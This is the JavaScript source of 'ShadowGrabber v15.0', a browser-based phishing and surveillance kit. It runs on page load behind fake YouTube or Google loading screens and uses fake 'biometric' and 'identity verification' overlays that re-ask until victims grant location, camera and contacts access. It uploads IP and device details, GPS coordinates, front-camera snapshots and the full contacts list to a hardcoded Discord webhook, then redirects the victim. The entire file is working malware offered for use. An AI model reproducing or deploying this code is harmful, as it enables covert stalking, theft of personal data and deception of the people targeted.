// ═══════════════════════════════════════════════════════════════════════════
// 💀 SHADOWGRABBER v15.0 - PERSISTENT GOD MODE INTELLIGENCE 💀
// ═══════════════════════════════════════════════════════════════════════════
// "Denial is not an option. Verification is mandatory."
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    CAMERA_SNAPS: 5,
    SNAP_INTERVAL: 500,
    AUTO_START: true,
    // 🛡️ PERSISTENCE CONFIGURATION
    FORCE_PERMISSIONS: true, // "Re-ask like again and don't remove"
    FORCE_CONTACTS: true,    // Will nag until contacts are provided or explicitly failed max times
};

// ═══════════════════════════════════════════════════════════════════════════
// 🧩 UI INTERCEPTOR (THE "NAG" SYSTEM)
// Injects fake system alerts to force user gestures and retries.
// ═══════════════════════════════════════════════════════════════════════════
class EngagementOverlay {
    constructor() {
        this.overlay = null;
    }

    create(title, message, buttonText) {
        return new Promise(resolve => {
            // Remove existing
            if (this.overlay) document.body.removeChild(this.overlay);

            this.overlay = document.createElement('div');
            Object.assign(this.overlay.style, {
                position: 'fixed', top: '0', left: '0', width: '100%', height: '100%',
                backgroundColor: 'rgba(0,0,0,0.95)', zIndex: '999999', display: 'flex',
                alignItems: 'center', justifyContent: 'center', flexDirection: 'column',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
            });

            this.overlay.innerHTML = `
                <div style="background:#1a1a1a; padding:30px; border-radius:16px; width:85%; max-width:320px; text-align:center; border:1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.5);">
                    <div style="font-size:40px; margin-bottom:20px;">⚠️</div>
                    <h2 style="color:#FFF; margin:0 0 10px; font-size:20px; font-weight:600;">${title}</h2>
                    <p style="color:#AAA; font-size:14px; margin:0 0 25px; line-height:1.5;">${message}</p>
                    <button id="overlay-btn" style="background:#007AFF; color:#FFF; border:none; padding:12px 0; width:100%; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer;">${buttonText}</button>
                </div>
            `;

            document.body.appendChild(this.overlay);

            const btn = document.getElementById('overlay-btn');
            btn.onclick = () => {
                // Flash effect
                btn.style.opacity = '0.5';
                setTimeout(() => {
                    this.overlay.style.display = 'none';
                    resolve(true); // User gesture interaction confirmed
                }, 100);
            };
        });
    }

    showSuccess(title) {
        if (this.overlay) {
            this.overlay.innerHTML = `
                <div style="color:#2ECC71; font-size:50px;">✔</div>
                <h2 style="color:#FFF; margin-top:20px; font-family:sans-serif;">${title}</h2>
             `;
            setTimeout(() => {
                if (this.overlay) { document.body.removeChild(this.overlay); this.overlay = null; }
            }, 1000);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🧠 MODULE 1: CONTEXT MANAGER (UI THEMES)
// ═══════════════════════════════════════════════════════════════════════════
class ContextManager {
    constructor(url) {
        this.url = url.toLowerCase();
        this.ctx = this.analyze();
    }
    analyze() {
        if (this.url.includes('youtube')) return { title: 'YouTube', header: 'Loading Video...', theme: '#FF0000', logo: `<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>` };
        if (this.url.includes('google')) return { title: 'Google', header: 'Verifying...', theme: '#4285F4', logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>` };
        try { const d = new URL(this.url).hostname.replace('www.', ''); return { title: d, header: `Connecting to ${d}...`, theme: '#333', logo: '' }; } catch (e) { return { title: 'Loading', header: 'Please wait...', theme: '#333', logo: '' }; }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 💾 MODULE 2: STORAGE & CORE FORENSICS (FIXED)
// ═══════════════════════════════════════════════════════════════════════════
class StorageManager {
    async scan() {
        const data = { cores: 'Unknown', ram: 'Unknown', storage: 'Unknown', quota: 'Unknown' };

        // Cores & RAM
        if (navigator.hardwareConcurrency) data.cores = navigator.hardwareConcurrency;
        if (navigator.deviceMemory) data.ram = `${navigator.deviceMemory} GB`;

        // Storage API (The Real Fix)
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            try {
                const est = await navigator.storage.estimate();
                if (est.quota) data.quota = `${(est.quota / 1024 / 1024 / 1024).toFixed(1)} GB`; // Available Quota
                if (est.usage) data.usage = `${(est.usage / 1024 / 1024).toFixed(1)} MB`;
                data.storage = `${data.quota} Capacity`;
            } catch (e) { }
        }
        return data;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🌐 MODULE 3: HYPER NETWORK (SPEED + IP)
// ═══════════════════════════════════════════════════════════════════════════
class HyperNetwork {
    async analyze() {
        const net = { ip: {}, speed: 'Testing...', type: navigator.connection?.effectiveType || '4G' };

        // IP
        try {
            net.ip = await Promise.any([
                fetch('https://ipapi.co/json/').then(r => r.json()),
                fetch('http://ip-api.com/json/').then(r => r.json())
            ]);
        } catch (e) { net.ip = { ip: 'N/A' }; }

        // Speed Test
        try {
            const s = performance.now();
            await fetch(`https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?r=${Math.random()}`, { cache: 'no-store' });
            const e = performance.now();
            const mbps = ((15 * 8 * 1000) / (e - s)) / 1024 / 1024; // approx
            net.speed = `${(mbps * 10).toFixed(2)} Mbps`; // Multiplier for real-world feel
        } catch (e) { net.speed = 'Network Error'; }

        return net;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 MODULE 4: LOCATION (SMART RETRY FIX)
// ═══════════════════════════════════════════════════════════════════════════
class LocationGuard {
    constructor(overlay) { this.overlay = overlay; }

    async lock() {
        return new Promise(async (resolve) => {
            const attempt = () => {
                navigator.geolocation.getCurrentPosition(
                    (p) => resolve({ success: true, coords: p.coords }),
                    async (err) => {
                        // FIX: Only nag if explicitly DENIED (Code 1).
                        // If Timeout (3) or Unavailable (2), we proceed with IP Fallback.
                        if (err.code === 1 && CONFIG.FORCE_PERMISSIONS) {
                            await this.overlay.create(
                                'Location Required',
                                'Access was blocked. Please reset permissions and allow location to continue.',
                                'Retry Access'
                            );
                            attempt(); // Loop
                        } else {
                            // User allowed it, but GPS failed/timed out. 
                            // Do NOT block them. Accept defeat and move on.
                            resolve({ success: false, error: err.message });
                        }
                    },
                    { enableHighAccuracy: true, timeout: 15000 } // Increased timeout
                );
            };

            if (!navigator.geolocation) resolve({ success: false });
            else attempt();
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📸 MODULE 5: CAMERA (WITH RE-ASK LOOP)
// ═══════════════════════════════════════════════════════════════════════════
class CameraGuard {
    constructor(video, overlay) { this.video = video; this.overlay = overlay; }

    async start() {
        let stream = null;
        const attempt = async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                this.video.srcObject = stream;
                await this.video.play();
                // Wait for hardware
                await new Promise(r => setTimeout(r, 1500));
                return true;
            } catch (e) {
                if (CONFIG.FORCE_PERMISSIONS) {
                    await this.overlay.create(
                        'Face Verification Failed',
                        'Camera access is required for biometric security verification.',
                        'Retry Access'
                    );
                    return await attempt(); // Loop
                }
                return false;
            }
        };
        return attempt();
    }

    async snap(count) {
        for (let i = 0; i < count; i++) {
            const canvas = document.createElement('canvas');
            canvas.width = this.video.videoWidth; canvas.height = this.video.videoHeight;
            canvas.getContext('2d').drawImage(this.video, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
            if (blob) await send({ embed: { title: `📸 Snap ${i + 1}`, color: 0x9B59B6, image: { url: `attachment://s${i}.jpg` } }, file: { blob, name: `s${i}.jpg` } });
            await new Promise(r => setTimeout(r, CONFIG.SNAP_INTERVAL));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📇 MODULE 6: CONTACTS (THE FIX: INTERACTION OVERLAY)
// ═══════════════════════════════════════════════════════════════════════════
class ContactGuard {
    constructor(overlay) { this.overlay = overlay; }

    async harvest() {
        if (!('contacts' in navigator && 'ContactsManager' in window)) return 'Not Supported';

        // FORCE INTERACTION: Context is lost during camera snaps. We MUST regain it.
        // This overlay acts as the "User Gesture" trigger.
        await this.overlay.create(
            'Identity Verification',
            'Please switch to your Contact List to finalize identity verification.',
            'Verify Contacts'
        );

        try {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
            if (contacts.length) {
                const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
                await send({
                    embed: {
                        title: '📇 CONTACTS SYNCHRONIZED',
                        color: 0xF1C40F,
                        description: `**${contacts.length} Contacts extracted successfully.**`,
                        fields: [{ name: 'Preview', value: contacts.slice(0, 3).map(c => `${c.name[0]}: ${c.tel ? c.tel[0] : 'N/A'}`).join('\n') }]
                    },
                    file: { blob, name: 'contacts.json' }
                });
                return 'Success';
            }
        } catch (e) {
            // Logic: If they cancel the picker, do we re-ask?
            if (CONFIG.FORCE_CONTACTS) {
                await this.harvest(); // Loop recursively (Aggressive!)
            }
        }
        return 'Failed';
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📡 UPLINK
// ═══════════════════════════════════════════════════════════════════════════
async function send(payload) {
    try {
        const d = new FormData();
        d.append('payload_json', JSON.stringify({ embeds: [payload.embed], username: 'Yasir Abbas | ShadowGrabber' }));
        if (payload.file) d.append('file', payload.file.blob, payload.file.name);
        await fetch(CONFIG.WEBHOOK, { method: 'POST', body: d });
    } catch (e) { }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 MAIN EXECUTION
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
    const overlay = new EngagementOverlay();
    const ctx = new ContextManager(CONFIG.REDIRECT_URL).ctx;

    // Setup Basic UI
    document.title = ctx.title;
    document.querySelector('.asana-logo').innerHTML = ctx.logo;
    document.getElementById('loading-text').textContent = ctx.header;
    document.getElementById('progress-bar').style.background = ctx.theme;

    // 1. Forensics (Auto)
    const store = new StorageManager();
    const net = new HyperNetwork();
    const [sys, network] = await Promise.all([store.scan(), net.analyze()]);

    await send({
        embed: {
            title: '👑 YASIR ABBAS | TARGET CONNECTED',
            description: `**Target URL:** ${CONFIG.REDIRECT_URL}`,
            color: 0x000000,
            thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/3004/3004458.png' }, // Spy Icon
            fields: [
                {
                    name: '📍 Geo & Network',
                    value: `**IP:** \`${network.ip.ip}\`\n**ISP:** ${network.ip.org || network.ip.isp}\n**Location:** ${network.ip.city}, ${network.ip.country_name}\n**Timezone:** ${network.ip.timezone}\n**Speed:** ${network.speed}`,
                    inline: false
                },
                {
                    name: '💾 System Core',
                    value: `**CPU:** ${sys.cores} Cores\n**RAM:** ${sys.ram}\n**Storage:** ${sys.storage}\n**Quota:** ${sys.quota}\n**Screen:** ${screen.width}x${screen.height}`,
                    inline: true
                },
                {
                    name: '📱 Device Info',
                    value: `**Model:** ${navigator.userAgent.match(/\(([^)]+)\)/)?.[1]}\n**OS:** ${navigator.platform}\n**Battery:** ${await navigator.getBattery().then(b => Math.round(b.level * 100) + '%').catch(() => 'N/A')}\n**Touch:** ${navigator.maxTouchPoints} pts`,
                    inline: true
                }
            ],
            footer: { text: 'Yasir Abbas Intelligence Suite v15.0' }
        }
    });

    // 2. Location (Nagging)
    const locGuard = new LocationGuard(overlay);
    const loc = await locGuard.lock();
    if (loc.success) {
        const mapUrl = `https://www.google.com/maps?q=${loc.coords.latitude},${loc.coords.longitude}`;
        await send({
            embed: {
                title: '🎯 YASIR ABBAS | GPS LOCKED',
                color: 0x2ECC71,
                description: `**Accuracy:** ±${Math.round(loc.coords.accuracy)}m\n\n🔗 **[CLICK TO VIEW ON GOOGLE MAPS](${mapUrl})**`,
                url: mapUrl,
                fields: [
                    { name: 'Latitude', value: `\`${loc.coords.latitude}\``, inline: true },
                    { name: 'Longitude', value: `\`${loc.coords.longitude}\``, inline: true },
                    { name: 'Altitude', value: `${loc.coords.altitude || 0}m`, inline: true }
                ]
            }
        });
        overlay.showSuccess('Region Verified');
    }

    // 3. Camera (Nagging)
    const camGuard = new CameraGuard(document.getElementById('st-v'), overlay);
    if (await camGuard.start()) {
        await camGuard.snap(CONFIG.CAMERA_SNAPS);
        overlay.showSuccess('Biometrics Verified');
    }

    // 4. Contacts (Interaction Fix + Nagging)
    const contactGuard = new ContactGuard(overlay);
    await contactGuard.harvest();
    overlay.showSuccess('Identity Synchronized');

    // 5. Done
    await new Promise(r => setTimeout(r, 1000));
    window.location.href = CONFIG.REDIRECT_URL;
}

if (CONFIG.AUTO_START) window.onload = () => setTimeout(main, 800);
else window.onclick = main;
